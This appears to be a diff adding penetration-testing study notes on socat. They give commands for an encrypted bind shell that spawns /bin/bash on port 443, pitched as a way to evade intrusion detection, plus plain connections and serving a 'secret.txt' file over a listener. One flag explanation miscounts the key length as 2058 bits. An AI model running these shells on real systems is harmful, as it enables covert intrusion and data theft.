@@ -1,0 +1,32 @@
+SOCAT ENCRYPTED BIND SHELL:
+>secure socket layer certificates
+>can assist in evading intrusion detection system
+>using openssl
+	|> req: initiate a new cerificate signing request
+	|> -newkey: generate a new private key
+	|> rsa:2048: use RSA encryption with a 2058-bit key length
+	|> -nodes: store the private key without passphrase protection
+	|> -keyout: save the key to a file
+	|> -x509: output a self-signed certificate instead of a certificate request
+	|> -days: set valid period in days
+	|> -out: output
+
+$openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 -out bind_shell.crt
+
+Now to key and ceritificate is generated we need to convert them to compatible format for socat. We combine the bind_shell.key and bind_shell.crt into a .pem file
+
+$sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+
+windows> socat - OPENSSL:ip:<port>,verify=0
+
+---connection----
+
+$socat - TCP4:<ip>:port
+$socat TCP4_LISTEN:443 STDOUT
+
+SOCAT FILE TRANSFERS
+
+$sudo socat TCP4-LISTEN:443,fork file:secret.txt
+
+> socat - OPENSSL:ip:port,verify=0
+
